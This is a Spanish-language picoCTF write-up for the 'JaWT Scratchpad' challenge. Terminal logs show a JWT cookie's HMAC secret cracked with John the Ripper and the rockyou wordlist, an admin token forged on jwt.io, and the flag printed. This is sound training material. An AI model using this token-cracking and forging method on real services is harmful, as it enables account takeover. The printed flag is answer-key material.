# JaWT Scratchpad

## Objetivo 
Descripción:
Los errores internos del servidor pueden ser devueltos intencionalmente por este desafío. Si experimenta uno, intente borrar sus cookies.

¡Revisa el bloc de notas del administrador! `https://jupiter.challenges.picoctf.org/problem/58210/`o http://jupiter.challenges.picoctf.org:58210

Sugerencias:
¿Qué es esa galleta?
¿Has oído hablar de JWT?

## Solución
``` shell
//nos dirigimos a la pagina `https://jupiter.challenges.picoctf.org/problem/58210/`

//para poder entrar tenemos que introdusir cualquier nombre ya que no podemos entrar con admin

//asi que instalaremos cookie-editor para poder modificar el jwt

https://jwt.io/#debugger-io

aqui podemos modificar el jwt

ahora podemos modificamos user y ponemos admin

ahora si nos mostrara el error

ahora borramos la cookie para intentar borrar el error 

recargamos la pagina y modificamos la cookies para intentarla craquear

guardamos la cookie en un archivo

┌──(mino20㉿kali)-[/home/mino20]
└─PS> nano hash                                                                                   

┌──(mino20㉿kali)-[/home/mino20]
└─PS> cat hash                                                                                    
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlubyJ9.Z8pSg-rEjXvQufpGXH485_CyAjiP2SBRf5PoWdJ9aZE

┌──(mino20㉿kali)-[/home/mino20]
└─PS> ls /usr/share/wordlists/                                                                    
amass  dirbuster      fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz

┌──(mino20㉿kali)-[/home/mino20]
└─PS> gzip -d /usr/share/wordlists/rockyou.txt.gz                                                 
gzip: /usr/share/wordlists/rockyou.txt: Permission denied

┌──(mino20㉿kali)-[/home/mino20]
└─PS> sudo gzip -d /usr/share/wordlists/rockyou.txt.gz                                            
[sudo] contraseña para mino20: 

┌──(mino20㉿kali)-[/home/mino20]
└─PS> ls /usr/share/wordlists/                                                                    
amass  dirbuster      fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz

┌──(mino20㉿kali)-[/home/mino20]
└─PS> head /usr/share/wordlists/rockyou.txt                                                       
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

┌──(mino20㉿kali)-[/home/mino20]
└─PS> sudo apt install john                                                                       
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
john ya está en su versión más reciente (1.9.0-Jumbo-1+git20211102-0kali3+b1).
fijado john como instalado manualmente.
0 actualizados, 0 nuevos se instalarán, 0 para eliminar y 562 no actualizados.

┌──(mino20㉿kali)-[/home/mino20]
└─PS> john                                                                                        
Created directory: /home/mino20/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options

┌──(mino20㉿kali)-[/home/mino20]
└─PS> john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2022-03-10 21:38) 0.2341g/s 1732Kp/s 1732Kc/s 1732KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

//copeamos la palabra ilovepico

//y la ponemos en VERIFY SIGNATURE
// justo en HMACSHA256

despues copeamos la cooken, guardamos y recargamos la pagina.

picoCTF{jawt_was_just_what_you_thought_44c752f5}
```

## Notas


## Referencias
[herramienta crakeo](https://github.com/openwall/john)